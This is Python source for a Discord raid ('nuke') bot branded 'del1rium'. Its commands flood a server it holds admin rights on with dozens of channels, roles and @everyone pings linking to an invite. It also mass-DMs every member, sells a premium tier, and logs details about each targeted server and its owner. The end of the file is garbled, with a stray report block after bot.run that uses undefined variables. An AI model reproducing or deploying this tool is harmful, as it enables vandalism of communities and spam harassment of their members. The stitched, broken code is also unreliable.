import discord
from discord.ext import commands
import asyncio
import os
import gc
from dotenv import load_dotenv
import engine
import worker # Direct access for some tasks

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ CONFIGURATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

DEFAULT_NAME = "premium-raid"
DEFAULT_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
RAID_ICON = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
PUBLIC_DM_TEXT = "https://discord.gg/cJJJWHfnn2"
PUBLIC_ROLE_NAME = "raid by del1rium co."

user_configs = {}

def get_config(user_id):
    return user_configs.get(user_id, {"name": DEFAULT_NAME, "text": DEFAULT_TEXT})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ INITIALIZATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

def check_premium(user_id):
    if user_id == OWNER_ID: return True
    central = bot.get_guild(CENTRAL_SERVER_ID)
    if not central: return False
    member = central.get_member(user_id)
    return member and any(r.id == PREMIUM_ROLE_ID for r in member.roles)

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    DEL1RIUM - ONLINE / EN LINEA
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    User / Usuario: {bot.user.name}
    Status / Estado: Ready / Listo
    Architecture: Triple-Layer (Main/Engine/Worker)
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ COMMANDS ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.command(name='help')
async def help_cmd(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    await ctx.message.delete()
    
    embed = discord.Embed(title="OPERATIONAL INTERFACE / INTERFAZ OPERATIVA", color=0x2b2d31)
    
    public_desc = (
        "**`:nuke`**\nStandard deployment (25 channels + 10 roles).\n*Despliegue estandar (25 canales + 10 roles).*\n\n"
        "**`:dmall`**\nSend fixed invitation to all members.\n*Envia invitacion fija a todos los miembros.*"
    )
    embed.add_field(name="PUBLIC MODULE / MODULO PUBLICO", value=public_desc, inline=False)
    
    premium_desc = (
        "**`:premiumnuke`**\nMassive deployment (50 channels + 20 roles).\n*Despliegue masivo (50 canales + 20 roles).*\n\n"
        "**`:nukeconfig <name>, <text>`**\nConfigure personal payload.\n*Configura tu carga personalizada.*\n\n"
        "**`:dmall <text>`**\nSend custom message to all members.\n*Envia mensaje personalizado a todos.*"
    )
    embed.add_field(name="PREMIUM MODULE / MODULO PREMIUM", value=premium_desc, inline=False)
    
    info_desc = (
        "**Prefix / Prefijo:** `:`\n"
        "**Status / Estado:** Online / En linea\n"
        "**Architecture:** Triple-Layer Optimized"
    )
    embed.add_field(name="SYSTEM INFORMATION / INFORMACION DEL SISTEMA", value=info_desc, inline=False)
    
    embed.set_footer(text="Del1rium Co. | Global Operations Management")
    await ctx.send(embed=embed, delete_after=60)

@bot.command(name='nuke')
async def nuke_cmd(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await engine.start_nuke(ctx, bot, "raid-by-del1rium", "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)", 25, 500, 10, PUBLIC_ROLE_NAME, False, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='premiumnuke')
async def premium_nuke_cmd(ctx):
    if not check_premium(ctx.author.id):
        embed = discord.Embed(title="RESTRICTED / RESTRINGIDO", description="Premium required.\nSuscripcion requerida.", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)
    
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    config = get_config(ctx.author.id)
    await engine.start_nuke(ctx, bot, config["name"], config["text"], 50, 1000, 20, config["name"], True, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='nukeconfig')
async def config_cmd(ctx, *, args: str = None):
    if not check_premium(ctx.author.id):
        embed = discord.Embed(title="RESTRICTED / RESTRINGIDO", description="Premium required.\nSuscripcion requerida.", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)

    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(title="ERROR", description="Usage: :nukeconfig name, text", color=0x2b2d31)
        return await ctx.send(embed=embed, delete_after=10)
    
    name, text = [x.strip() for x in args.split(",", 1)]
    user_configs[ctx.author.id] = {"name": name, "text": text}
    try: await ctx.message.delete()
    except: pass
    
    embed = discord.Embed(title="UPDATED / ACTUALIZADO", color=0x2b2d31)
    embed.add_field(name="Payload", value=f"Name: `{name}`\nText: ```{text}```", inline=False)
    await ctx.send(embed=embed, delete_after=15)
    gc.collect()

@bot.command(name='dmall')
async def dmall_cmd(ctx, *, message: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    await ctx.message.delete()
    is_user_premium = check_premium(ctx.author.id)
    final_message = message if (is_user_premium and message) else PUBLIC_DM_TEXT
    
    # Use the specialized worker for DM
    count = await worker.mass_dm_worker(ctx.guild, final_message, is_user_premium)
    
    embed = discord.Embed(title="DM ALL", description=f"Messages sent / Mensajes enviados: {count}", color=0x2b2d31)
    if not is_user_premium:
        embed.set_footer(text="Public version: Fixed invitation sent.")
    await ctx.send(embed=embed, delete_after=15)
    gc.collect()

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("ERROR: TOKEN NOT FOUND")
    duration = (end_time - start_time).total_seconds()
    type_str = "PREMIUM" if premium else "STANDARD"
    
    embed = discord.Embed(title="DETAILED OPERATION REPORT / REPORTE DETALLADO", color=0x2b2d31, timestamp=datetime.utcnow())
    
    server_info = (
        f"**Name / Nombre:** {guild.name}\n"
        f"**ID:** `{guild.id}`\n"
        f"**Owner / Dueno:** {guild.owner.mention} `({guild.owner.id})`\n"
        f"**Boost Level / Nivel:** {guild.premium_tier}\n"
        f"**Members / Miembros:** {guild.member_count}"
    )
    embed.add_field(name="TARGET INFORMATION / INFORMACION DEL OBJETIVO", value=server_info, inline=False)
    
    exec_info = (
        f"**Operator / Operador:** {ctx.author.mention}\n"
        f"**Type / Tipo:** `{type_str}`\n"
        f"**Duration / Duracion:** `{duration:.2f}s`"
    )
    embed.add_field(name="EXECUTION DETAILS / DETALLES DE EJECUCION", value=exec_info, inline=True)
    
    stats_info = (
        f"**Channels / Canales:** {channels}\n"
        f"**Total Pings:** {pings}\n"
        f"**Status / Estado:** Completed & Cleaned / Finalizado y Limpio"
    )
    embed.add_field(name="STATISTICS / ESTADISTICAS", value=stats_info, inline=True)
    
    if guild.icon: embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="Del1rium Co. | System Optimized")
    
    try: await log_channel.send(embed=embed)
    except: pass
